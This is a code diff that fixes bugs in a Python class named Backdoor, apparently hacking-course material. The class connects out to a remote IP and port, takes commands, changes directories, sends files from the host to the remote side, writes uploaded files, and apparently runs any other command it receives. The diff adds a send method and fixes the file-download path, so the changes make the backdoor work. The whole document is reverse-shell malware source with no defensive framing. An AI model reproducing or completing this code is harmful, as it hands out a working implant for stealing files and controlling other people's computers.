@@ -9,7 +9,11 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
-    def reliabl_receive(self):
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
         json_data = ""
         while True:
             try:
@@ -37,7 +41,8 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliabl_receive()
+            command = self.reliable_receive()
+            print(command)
             try:
                 if command[0] == "exit":
                     self.connection.close()
@@ -45,7 +50,7 @@ class Backdoor:
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
-                    command_result= self.read_file()
+                    command_result= self.read_file(command[1])
                 elif command[0] == "upload":
                     command_result = self.write_file(command[1], command[2])
                 else:
@@ -54,7 +59,8 @@ class Backdoor:
             except Exception:
                 command_result = "[-] Error during comand execution."
 
-            self.reliabl_receive(command_result)
+            print(command_result)
+            self.reliable_send(command_result)
 
 args = get_arguments()
 
